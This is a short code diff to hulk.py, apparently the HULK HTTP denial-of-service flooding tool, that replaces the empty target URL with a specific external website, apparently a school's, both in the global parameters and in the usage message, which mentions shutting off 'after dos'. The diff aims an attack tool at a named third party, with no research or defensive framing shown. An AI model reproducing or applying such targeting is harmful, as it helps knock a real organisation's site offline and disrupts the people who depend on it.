@@ -14,7 +14,7 @@ import random
 import re
 
 #global params
-url=''
+url='http://dpssl.edunexttechnologies.com/'
 host=''
 headers_useragents=[]
 headers_referers=[]
@@ -70,7 +70,7 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
+	print 'USAGE: python hulk.py http://dpssl.edunexttechnologies.com/'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
